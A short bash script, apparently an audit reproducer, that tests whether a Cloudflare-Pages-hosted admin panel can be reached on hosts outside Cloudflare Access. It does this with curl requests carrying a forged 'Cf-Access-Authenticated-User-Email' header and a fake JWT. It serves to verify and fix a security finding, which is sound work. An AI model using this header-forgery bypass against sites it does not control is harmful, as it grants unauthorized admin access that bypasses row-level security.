#!/usr/bin/env bash
# End-to-end reproducer sketch for Finding 1 (hostname-based admin bypass).
#
# Wire in a hostname that resolves to the dyad Cloudflare Pages project but
# is NOT covered by the same Cloudflare Access application that protects
# admin.dyad.berlin. Common shapes:
#   - <branch>.<project>.pages.dev   (preview URLs)
#   - <project>.pages.dev            (project canonical Pages URL)
#   - a staging or legacy custom domain pointed at the same project
#
# If the gate is intact, expect 401/403/empty. If the gate is broken,
# expect a 200 with the admin shell HTML (look for <h1>Admin</h1> or a
# /admin/* link in the body).
#
# DO NOT RUN this against production unless you own the deployment. The
# admin plane writes via the service-role client; any action you trigger
# bypasses RLS.

set -euo pipefail

HOST="${1:-}"
if [[ -z "$HOST" ]]; then
	cat >&2 <<'EOF'
usage: repro-curl.sh <hostname>

  hostname   A non-Access-gated host serving the same dyad build.
             Example: feature-x.dyad-berlin.pages.dev

EOF
	exit 2
fi

PATH_UNDER_TEST="/admin/members"
SPOOFED_EMAIL="attacker@example.com"

echo "=== Probe 1: bare request (no header) — expect 401 'Admin access requires Cloudflare Access authentication.' ==="
curl -sS -i "https://${HOST}${PATH_UNDER_TEST}" | head -n 20
echo

echo "=== Probe 2: forged email header — if a 200 with admin HTML comes back, the gate is broken ==="
curl -sS -i \
	-H "Cf-Access-Authenticated-User-Email: ${SPOOFED_EMAIL}" \
	"https://${HOST}${PATH_UNDER_TEST}" | head -n 40
echo

echo "=== Probe 3: forged email header + obviously-invalid JWT — post-fix the JWT must be rejected, NOT silently overridden by the header ==="
curl -sS -i \
	-H "Cf-Access-Authenticated-User-Email: ${SPOOFED_EMAIL}" \
	-H "Cf-Access-Jwt-Assertion: not.a.real.jwt" \
	"https://${HOST}${PATH_UNDER_TEST}" | head -n 40
echo

echo "Done. Look at probe 2 and 3: any 200 response with admin shell content is the bug."
